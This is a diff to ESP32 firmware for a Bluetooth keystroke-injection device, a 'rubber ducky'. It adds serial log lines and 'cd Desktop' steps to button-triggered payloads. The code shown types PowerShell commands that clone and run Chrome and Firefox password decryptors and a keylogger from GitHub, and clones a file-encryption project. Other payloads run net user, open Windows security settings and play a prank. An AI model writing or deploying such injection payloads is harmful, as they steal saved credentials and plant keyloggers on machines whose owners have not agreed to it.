@@ -102,6 +102,7 @@ void loop() {
       sendString(url, 10); delay(300); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Rickroll Payload executed");
     }
 
     // Button 2: System Info (Pin 17)
@@ -114,6 +115,7 @@ void loop() {
       sendString("systeminfo", 10); delay(200); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("System Info Payload executed");
     }
 
     // Button 3: Windows Lock + Notepad Message (Pin 18)
@@ -134,6 +136,7 @@ void loop() {
       bleKeyboard.releaseAll(); delay(1000);
       sendString("This is bluetooth usb rubber ducky script is started on your computer system", 10); 
       delay(500);
+      Serial.println("Windows Lock + Notepad Message Payload executed");
     }
 
     // Button 4: Decrypt Chrome Passwords (Pin 19)
@@ -141,7 +144,10 @@ void loop() {
       Serial.println("Button 4: Decrypt Chrome Passwords (Pin 19)");
       openRun(); delay(300); 
       sendString("powershell"); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(300); 
+      bleKeyboard.press(KEY_RETURN); delay(300);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("cd Desktop", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(7000);
       sendString("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
@@ -155,6 +161,7 @@ void loop() {
       sendString("python decrypt_chrome_password.py", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
+      Serial.println("Decrypt Chrome Passwords Payload executed");
     }
 
     // Button 5: Task Manager Admin (Pin 21)
@@ -171,6 +178,7 @@ void loop() {
       bleKeyboard.releaseAll(); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
+      Serial.println("Task Manager Admin Payload executed");
     }
 
     // Button 6: Calculator (Pin 22)
@@ -180,6 +188,7 @@ void loop() {
       sendString("calc"); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Calculator Payload executed");
     }
 
     // Button 7: Virus & Threat Protection (Pin 23)
@@ -200,12 +209,13 @@ void loop() {
       bleKeyboard.releaseAll();
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
-      bleKeyboard.press(KEY_SPACE); delay(100); 
+      bleKeyboard.press(' '); delay(100); // Fixed: Changed KEY_SPACEBAR to ' ' (space character)
       bleKeyboard.releaseAll(); delay(500);
       bleKeyboard.press(KEY_LEFT_ARROW); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
+      Serial.println("Virus & Threat Protection Payload executed");
     }
 
     // Button 8: Firefox Decrypt (Pin 25)
@@ -214,7 +224,10 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
       sendString("powershell", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("cd Desktop", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(7000);
       sendString("git clone https://github.com/unode/firefox_decrypt.git", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
@@ -228,6 +241,7 @@ void loop() {
       sendString("2", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Firefox Decrypt Payload executed");
     }
 
     // Button 9: Copy Files Payload (Pin 26)
@@ -261,7 +275,7 @@ void loop() {
       bleKeyboard.press('x'); 
       delay(100); 
       bleKeyboard.releaseAll(); delay(500);
-      Serial.println("Notepad Message + Save executed");
+      Serial.println("Notepad Message + Save Payload executed");
     }
 
     // Button 11: Net User Command (Pin 32)
@@ -277,7 +291,7 @@ void loop() {
       sendString("exit", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
-      Serial.println("Net User Command executed");
+      Serial.println("Net User Command Payload executed");
     }
 
     // Button 12: Open 5 Notepads (Pin 33)
@@ -289,7 +303,7 @@ void loop() {
         bleKeyboard.press(KEY_RETURN); delay(100); 
         bleKeyboard.releaseAll(); delay(1000);
       }
-      Serial.println("Open 5 Notepads executed");
+      Serial.println("Open 5 Notepads Payload executed");
     }
 
     // Button 13: Open 5 CMDs (Pin 14)
@@ -301,7 +315,7 @@ void loop() {
         bleKeyboard.press(KEY_RETURN); delay(100); 
         bleKeyboard.releaseAll(); delay(1000);
       }
-      Serial.println("Open 5 CMDs executed");
+      Serial.println("Open 5 CMDs Payload executed");
     }
 
     // Button 14: Keylogger (Pin 12)
@@ -310,6 +324,9 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
       sendString("powershell", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("cd Desktop", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
       sendString("git clone https://github.com/sachinpandey7709/Keylogger.git", 10); delay(100); 
@@ -330,6 +347,9 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
       sendString("powershell", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("cd Desktop", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
       sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 10); delay(100); 
